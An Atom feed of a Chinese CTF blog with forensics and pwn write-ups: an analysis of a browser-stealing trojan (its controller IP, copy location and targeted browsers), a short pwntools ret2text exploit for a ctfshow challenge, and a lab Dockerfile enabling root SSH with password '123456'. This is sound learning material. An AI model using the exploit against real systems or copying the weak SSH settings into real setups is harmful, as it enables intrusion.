<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xvzhang🥝</title>
  
  
  <link href="https://www.xvzhang.fun/atom.xml" rel="self"/>
  
  <link href="https://www.xvzhang.fun/"/>
  <updated>2025-05-13T02:43:27.740Z</updated>
  <id>https://www.xvzhang.fun/</id>
  
  <author>
    <name>xvzhang🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>盘古石计算机取证大赛-WP</title>
    <link href="https://www.xvzhang.fun/posts/ef89deac.html"/>
    <id>https://www.xvzhang.fun/posts/ef89deac.html</id>
    <published>2025-05-10T03:53:26.000Z</published>
    <updated>2025-05-13T02:43:27.740Z</updated>
    
    <content type="html"><![CDATA[<h1>计算机取证</h1><ol start="9"><li>计算机装过一款反取证软件为？【标准格式：EnCrypt.exe】 What anti-forensic software was installed on the computer? [Answer example: EnCrypt.exe]<br>VeraCrypt.exe<br>计算机分析软件分析得出<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101352132.png" alt="alt text"></li></ol><h1>EXE取证</h1><ol><li>分析Windows木马，其控制端ip是？[标准格式：192.168.1.11] Analyze the Windows trojan virus: What is its controller IP? [Answer format: 192.168.1.11]<br>104.18.45.79<br>在虚拟仿真系统安全中心中发现，然后将该程序下载下来，丢到微步云沙箱上，得到答案。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101416224.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101418490.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101418010.png" alt="alt text"></li><li>软件会复制自身到哪个文件夹下？[标准格式：DaTa] Which folder does the malware copy itself to? [Answer format: DaTa]<br>SubDir<br>根据微步沙箱分析，确定是复制到该文件夹下<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101421678.png" alt="alt text"></li><li>接上题，复制后软件名称是？[标准格式：AppTmp.exe] Continuing last question, What is the copied filename? [Answer format: AppTmp.exe]<br>BwAcr.exe<br>由上题可知，复制后软件名称。</li><li>软件一共可以窃取多少种浏览器的信息？[标准格式：3] How many types of browsers can the malware extract data from? [Answer format: 3]<br>8<br>利用<code>exeinfo</code>检查发现，是<code>.Net</code>架构程序<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101746068.png" alt="alt text"><br>遂使用<code>dnSpy</code>进行反编译，发现存在混淆<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101747723.png" alt="alt text"><br>使用<code>de4dot</code>工具进行反混淆<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101744187.png" alt="alt text"><br>然后使用<code>dnSpy</code>进行反编译后审计。<br>在<code>GClass15</code>中发现它有逻辑进行判断，刚开始以为他在读取<code>chromium</code>浏览器的数据，最后发现这是当未检测到存在浏览器时会返回的信息。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101638633.png" alt="alt text"><br><code>GClass16</code>读取<code>Brave-Browser</code>浏览器信息<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101640744.png" alt="alt text"><br><code>GClass17</code>读取<code>google-chrome</code>浏览器信息<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642109.png" alt="alt text"></li></ol><p><code>GClass18</code>读取<code>edge</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642557.png" alt="alt text"><br><code>GClass19</code>读取<code>Opera GX</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101642920.png" alt="alt text"><br><code>GClass20</code>读取<code>Opera</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101644701.png" alt="alt text"></p><p><code>GClass21</code>读取<code>YandexBrowser</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101644224.png" alt="alt text"><br><code>GClass23</code>读取<code>firefox</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101646726.png" alt="alt text"><br><code>GClass24``GClass25</code>读取<code>Internet Explorer</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101649221.png" alt="alt text"><br>原本计算为9个，结果尝试提交发现分值没有发生变化，回去再仔细审计，发现<code>15</code>定义的检查系统中是否存在指定浏览器的操作，所以应该是8个。<br>5. 软件查询安装的杀毒软件出错或异常会返回什么字符串？[标准格式：Apps] What error message is returned when the malware fails to detect antivirus software? [Answer format: Apps]<br>Unknown<br><code>GClass61</code>定义了该方法，会回复<code>Unknown</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101700613.png" alt="alt text"></p>]]></content>
    
    
    <summary type="html">电子取证，全靠大佬带飞，仅仅做出来几道</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>iscc挑战赛-WP</title>
    <link href="https://www.xvzhang.fun/posts/5bbfef93.html"/>
    <id>https://www.xvzhang.fun/posts/5bbfef93.html</id>
    <published>2025-05-10T03:53:01.000Z</published>
    <updated>2025-05-13T02:43:08.852Z</updated>
    
    <content type="html"><![CDATA[<h1>pwn</h1><h2 id="pwn01-genius">pwn01-genius</h2><p>You are a genius?<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101155336.png" alt="alt text"><br>开启NX以及cannary保护<br>IDA反编译查看，找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101156338.png" alt="alt text"><br>程序从main函数开始，依次满足条件从function1执行到3，触发栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101157376.png" alt="alt text"></p>]]></content>
    
    
    <summary type="html">iscc挑战赛，咱就是说，平台是真卡</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow_pwn系列刷题</title>
    <link href="https://www.xvzhang.fun/posts/987b4188.html"/>
    <id>https://www.xvzhang.fun/posts/987b4188.html</id>
    <published>2025-05-08T09:29:54.000Z</published>
    <updated>2025-05-13T02:43:34.840Z</updated>
    
    <content type="html"><![CDATA[<h1>练习题</h1><h2 id="pwn签到题">pwn签到题</h2><p>nc直连即可<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508173137.png" alt="alt text"></p><h2 id="pwn02">pwn02</h2><p>checksec查保护信息并运行，发现为32位程序，看到存在输入<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508173406.png" alt="alt text"><br>使用ida反编译，发现存在fgets函数栈溢出，并且存在<code>system</code>函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508173507.png" alt="alt text"><br>找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508173614.png" alt="alt text"><br>打<code>ret2text</code>即可<br>计算偏移量得：<code>0x09</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508212437.png" alt="alt text"></p><p>后门函数地址：<code>0x0804851D </code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20250508212606.png" alt="alt text"><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28148</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x09</span> + <span class="number">0x04</span></span><br><span class="line">backdoor_addr = <span class="number">0x0804850F</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505082146309.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505082149411.png" alt="alt text"></p><h2 id="pwn03">pwn03</h2><h2 id="pwn04">pwn04</h2><h2 id="pwn05">pwn05</h2><h2 id="pwn06">pwn06</h2><h2 id="pwn07">pwn07</h2><h2 id="01栈溢出之ret2text">01栈溢出之ret2text</h2><h2 id="pwn10">pwn10</h2>]]></content>
    
    
    <summary type="html">ctfshow_pwn刷题笔记</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn入门之路（一）</title>
    <link href="https://www.xvzhang.fun/posts/21963e19.html"/>
    <id>https://www.xvzhang.fun/posts/21963e19.html</id>
    <published>2025-05-07T08:03:41.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>pwn入门之路（一）</h1><p>学pwn！！！</p><h2 id="pwn环境搭建">pwn环境搭建</h2><p>现在我使用wsl以及网上找的一套程序虚拟机在搭配使用，之前使用的方案是<code>docker</code>，分享出来给大家看看。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">e  </span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">ARG</span> HTTP_PROXY=http://<span class="number">192.168</span>.<span class="number">31.71</span>:<span class="number">7897</span>  </span><br><span class="line"><span class="keyword">ARG</span> HTTPS_PROXY=http://<span class="number">192.168</span>.<span class="number">31.71</span>:<span class="number">7897</span>  </span><br><span class="line"><span class="keyword">ENV</span> HTTP_PROXY=$&#123;HTTP_PROXY&#125;  </span><br><span class="line"><span class="keyword">ENV</span> HTTPS_PROXY=$&#123;HTTPS_PROXY&#125;  </span><br><span class="line"><span class="keyword">ENV</span> ALL_PROXY=$&#123;HTTP_PROXY&#125;  </span><br><span class="line"><span class="comment"># pre-install softwares  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">    apt-get -y update &amp;&amp; \  </span><br><span class="line">    apt-get install -y lib32z1  apt-utils apt-transport-https python3 python3-pip git \  </span><br><span class="line">    libglib2.<span class="number">0</span>-dev libfdt-dev libpixman-<span class="number">1</span>-dev zlib1g-dev openssh-server net-tools\  </span><br><span class="line">    vim nano netcat openssh-server unzip make wget bison flex build-essential \  </span><br><span class="line">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole gdb-multiarch ruby \  </span><br><span class="line">    patchelf gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gcc-mips-linux-gnu gcc-mipsel-linux-gnu \  </span><br><span class="line">    gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 libseccomp-dev libffi-dev ruby-dev \   </span><br><span class="line">    build-essential file foremost unzip tar gzip nodejs npm zstd rpm2cpio cpio binutils dpkg-dev jq   </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> dpkg --add-architecture i386  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y gcc-multilib g++-multilib libc6-dev-i386  </span></span><br><span class="line"><span class="comment"># enable ssh login  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -f /etc/service/sshd/down  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -ri <span class="string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\  </span></span><br><span class="line">    sed -ri <span class="string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \  </span><br><span class="line">    sed -ri <span class="string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \  </span><br><span class="line">    sed -ri <span class="string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># enable login with password  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># set username and password  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd xvzhang &amp;&amp; \  </span></span><br><span class="line">    useradd -g xvzhang xvzhang -m -s /bin/bash &amp;&amp; \  </span><br><span class="line">    echo <span class="string">&quot;xvzhang:123456&quot;</span> | chpasswd &amp;&amp; \  </span><br><span class="line">    echo <span class="string">&quot;root:123456&quot;</span> | chpasswd  </span><br><span class="line"><span class="comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> service ssh start  </span></span><br><span class="line"><span class="comment"># keep container running  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># enable sudo  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y <span class="built_in">sudo</span> &amp;&amp; \  </span></span><br><span class="line">    usermod -aG sudo xvzhang  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># pwn-related tools  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \  </span></span><br><span class="line">    python3 -m pip config set global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \  </span><br><span class="line">    python3 -m pip install -U pip &amp;&amp; \  </span><br><span class="line">    python3 -m pip install --no-cache-dir \  </span><br><span class="line">    pwntools \  </span><br><span class="line">    ropgadget \  </span><br><span class="line">    z3-solver \  </span><br><span class="line">    smmap2 \  </span><br><span class="line">    apscheduler \  </span><br><span class="line">    ropper \  </span><br><span class="line">    unicorn \  </span><br><span class="line">    keystone-engine \  </span><br><span class="line">    capstone \  </span><br><span class="line">    angr \  </span><br><span class="line">    pebble \  </span><br><span class="line">    r2pipe \  </span><br><span class="line">    LibcSearcher \  </span><br><span class="line">    ctools \   </span><br><span class="line">    poetry  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /tools  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg /tools/pwndbg &amp;&amp; \  </span></span><br><span class="line">    cd /tools/pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/longld/peda.git /tools/peda  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/hugsy/gef.git /tools/gef  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git /tools/Pwngdb  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git /tools/ROPgadget &amp;&amp; \  </span></span><br><span class="line">    cd /tools/ROPgadget &amp;&amp; pip install .  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git /tools/LibcSearcher &amp;&amp; \  </span></span><br><span class="line">    cd /tools/LibcSearcher &amp;&amp; pip install . &amp;&amp; rm -rf libc-database &amp;&amp; git clone https://github.com/niklasb/libc-database.git &amp;&amp; cd /tools/LibcSearcher/libc-database &amp;&amp; ./get all   </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf /tools/vmlinux-to-elf &amp;&amp; \  </span></span><br><span class="line">    cd /tools/vmlinux-to-elf &amp;&amp; pip install .  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://github.com/XDSEC/WebSocketReflectorX/releases/download/0.3.3/wsrx-cli-0.3.3-linux64-musl.tar.gz /root &amp;&amp; <span class="built_in">cd</span> /root &amp;&amp; tar -xzvf wsrx-cli-0.3.3-linux64-musl.tar.gz  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/TTY-flag/evilPatcher.git /tools/EvilPatcher  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/ErodedElk/ToPaWaf.git /tools/ToPaWaf  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git /tools/glibc-all-in-one &amp;&amp; <span class="built_in">cd</span> /tools/glibc-all-in-one &amp;&amp; ./update-list  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gem install one_gadget seccomp-tools   </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /root/.gdbinit  </span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./.gdbinit /root/.gdbinit  </span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./.vscode-server /root/.vscode-server  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \<span class="built_in">chmod</span> 755 msfinstall &amp;&amp; \./msfinstall  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y postgresql  </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget https://golang.google.cn/dl/go1.24.1.linux-amd64.tar.gz -O /tmp/go.tar.gz &amp;&amp; \   </span></span><br><span class="line">    tar -C /usr/local -xzf /tmp/go.tar.gz &amp;&amp; rm /tmp/go.tar.gz   </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;export GOROOT=/usr/local/go \   </span></span></span><br><span class="line">    export PATH=$GOPATH/bin:$GOROOT/bin:$PATH \   </span><br><span class="line">    export GOPATH=/go \   </span><br><span class="line">    export GOPROXY=https://mirrors.aliyun.com/goproxy/,direct \  </span><br><span class="line">    <span class="string">&quot; &gt;&gt; ~/.bashrc  </span></span><br><span class="line"><span class="string">ENV GOROOT=/usr/local/go   </span></span><br><span class="line"><span class="string">ENV GOPATH=/go   </span></span><br><span class="line"><span class="string">ENV PATH=$GOPATH/bin:$GOROOT/bin:$PATH  </span></span><br><span class="line"><span class="string">ENV GOPROXY=https://mirrors.aliyun.com/goproxy/,direct  </span></span><br><span class="line"><span class="string">RUN go env -w GO111MODULE=on  </span></span><br><span class="line"><span class="string">RUN go install github.com/jesseduffield/lazygit@latest  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">CMD [&quot;</span>/root/start.sh<span class="string">&quot;]  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">EXPOSE 22  </span></span><br><span class="line"><span class="string">CMD [&quot;</span>/usr/sbin/sshd<span class="string">&quot;, &quot;</span>-D<span class="string">&quot;]</span></span><br></pre></td></tr></table></figure><p><code>.gdbinit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pwndgb</span>  </span><br><span class="line">source /tools/pwndbg/gdbinit.py  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">peda</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">source</span> /tools/peda/peda.py</span>  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gef</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">source</span> /tools/gef/gef.py</span>  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pwngdb</span>  </span><br><span class="line">source /tools/Pwngdb/pwngdb.py  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pwngdb</span>  </span><br><span class="line">source /tools/Pwngdb/angelheap/gdbinit.py  </span><br><span class="line">set disassembly-flavor intel  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span> show-tips off</span>  </span><br><span class="line">set confirm off  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pwngdb</span>  </span><br><span class="line">define hook-run  </span><br><span class="line">python  </span><br><span class="line">import angelheap  </span><br><span class="line">angelheap.init_angelheap()  </span><br><span class="line">end  </span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><code>start_pwn.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span>  </span><br><span class="line">  </span><br><span class="line">docker run -d \  </span><br><span class="line">    -p 25000:22 \  </span><br><span class="line">    -v /home/xvzhang/Documents/CTF_topic/pwn/buu_ctf_test/:/home/pwn_title \  </span><br><span class="line">    --name pwn_container \  </span><br><span class="line">    --rm \  </span><br><span class="line">    pwnenv_mypwn:latest \</span><br></pre></td></tr></table></figure><h2 id="栈">栈</h2><h3 id="基本栈介绍">基本栈介绍</h3><p>栈是一种典型的**先进后出(Last in First Out)**的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作。两种操作均有栈顶以及栈底。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/fb49d852-79cc-45b5-9fed-9b95cf49b5a9.png" alt="alt text"><br>高级语言 在运行时都会被转换为汇编程序，在汇编程序运行过程中，使用栈数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保护函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。<strong>程序的栈是从进程地址空间的高地址向低地址增长</strong></p><h3 id="函数调用栈">函数调用栈</h3><p>程序的执行过程可看做连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令（紧接call指令）处继续执行。函数调用过程通常使用堆栈实现，每个用户进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值（即函数调用的上下文）以备回复以及存储本地局部变量。<br>IA32处理器寄存器：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/287607a6-9b89-4e50-a6d5-4a30a5a1ff6a.png" alt="alt text"><br>不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如X86架构用字母&quot;e(extended)&quot;作名称前缀，指示寄存器大小为32位；x86_64架构用字母&quot;r&quot;作名称前缀，指示各寄存器大小64位。<br>许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。</p><h4 id="栈帧结构">栈帧结构</h4><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的悉尼线。每个未完成运行的函数占用一个独立的连续区域，称为栈帧(Stack Frame)栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈，当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。<br>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定（指针存放在相应寄存器中）。EBP指向当前栈帧底部（高地址），在当前栈帧内位置固定；ESP指向当前栈帧顶部（低地址），当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。<br>帧基指针(EBP)，栈顶指针(ESP)，并在引用汇编代码时分别记为%ebp和%esp<br>函数调用栈的典型内存布局：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4fe23c6c-f968-4919-b9d5-2c92dd442a15.png" alt="alt text"><br>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，&quot;m(%ebp)&quot;表示以EBP为基地址、偏移量为m字节的内存空间（中的内容）。函数可以没有参数和局部变量，故&quot;Argument（参数）&quot;和&quot;Local Variable（局部变量）&quot;不是函数栈帧结构的必需部分。<br>图中的入栈顺序<br>| 实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N 